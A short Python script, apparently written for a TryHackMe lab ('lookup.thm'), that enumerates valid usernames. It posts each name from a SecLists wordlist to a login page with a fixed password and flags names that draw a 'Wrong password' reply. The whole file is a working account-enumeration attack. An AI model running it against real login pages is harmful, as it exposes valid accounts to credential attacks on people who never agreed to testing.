import requests

url = "http://lookup.thm/login.php"

file_Name_Path = "/usr/share/seclists/Usernames/Names/names.txt"

with open(file_Name_Path, "r") as f:
    for line in f:
        username = line.strip() 
        if not username:
            continue 

        data = {
            "username": username,
            "password": "testPassword"
        }

        response = requests.post(url, data=data) 

        if "Wrong password" in response.text:
            print(f"Trouvé : {username}")
        else: 
            print("nope")
